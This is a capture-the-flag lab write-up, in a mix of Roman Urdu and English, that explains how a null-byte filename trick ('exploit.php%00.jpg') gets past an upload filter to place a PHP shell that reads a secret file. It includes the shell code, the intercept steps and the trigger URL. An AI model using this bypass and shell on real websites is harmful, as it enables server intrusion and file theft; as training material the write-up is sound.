## Web shell upload via obfuscated file extension

### 🧠 **Lab Ka Core Concept**:

* Website **image file upload allow** kar rahi hai.
* **.php** jaise dangerous extensions **block** kiye gaye hain.
* Lekin hum **null byte injection** se **filename ko obfuscate** (dhoka) dekar **PHP shell** upload karwa sakte hain.

---

### ✅ **Goal**:

`/home/carlos/secret` file ka content nikaalna using uploaded PHP shell.

---

### 🔐 Login Info:

```
Username: wiener  
Password: peter
```

---

### 🧪 Maine Lab Kaisy Solve Kiya:

1. Sab se pehle aik file banayi `exploit.php` naam se. Ismein yeh code likha:

   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```

2. Website pe login kiya (wiener/peter) aur **account** page pe gaya.

3. BurpSuite ka **intercept mode ON** kiya.

4. `exploit.php` file ko avatar ke tor pe upload kiya — request Burp mein intercept ho gayi.

5. Us **POST request** mein yeh line dhoondi:

   ```
   filename="exploit.php"
   ```

6. Usko change kiya:

   ```
   filename="exploit.php%00.jpg"
   ```

   `%00` ka matlab hai **null byte**, jo backend ko confuse karta hai — woh `.php` ko hi valid samajhta hai.

7. Request forward kar di aur **intercept off** kar diya.

8. File upload ho gayi, ab main URL pe gaya:

   ```
   https://<lab-url>/files/avatars/exploit.php
   ```

9. Mujhe Carlos ka secret mil gaya!

10. Secret ko lab ke box mein submit kiya — **Lab Solved 🎯**

---

### 📌 Seekhnay Wali Baat:

Null byte (`%00`) ka use hum **file extension validation** ko bypass karne ke liye karte hain. Bohat si real websites mein agar backend validation weak ho to is technique se web shell upload ho sakti hai.
